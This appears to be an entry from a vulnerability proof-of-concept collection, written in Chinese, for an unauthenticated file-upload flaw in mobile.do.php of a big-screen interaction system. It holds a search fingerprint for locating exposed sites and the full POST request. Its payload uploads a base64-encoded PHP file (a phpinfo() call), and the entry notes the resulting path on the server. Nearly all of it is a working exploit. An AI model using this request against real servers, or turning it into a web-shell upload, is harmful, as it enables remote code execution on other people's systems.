# 金华迪加网络科技有限公司现场大屏互动系统mobile.do.php存在文件上传漏洞

- **系统**：金华迪加网络科技有限公司现场大屏互动系统.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/wall/themes/meepo/assets/images/defaultbg.jpg"`
- **请求**：`POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=qrchh064ani2b3h8flue9qo6e6`　`Content-Length: 52`　`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`　`Priority: u=0, i`

**请求体 / payload**
```
filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpOw%3D%3D
上传定位：data//pic//pic_172973993847989.php
```
- **预期**：200　|　—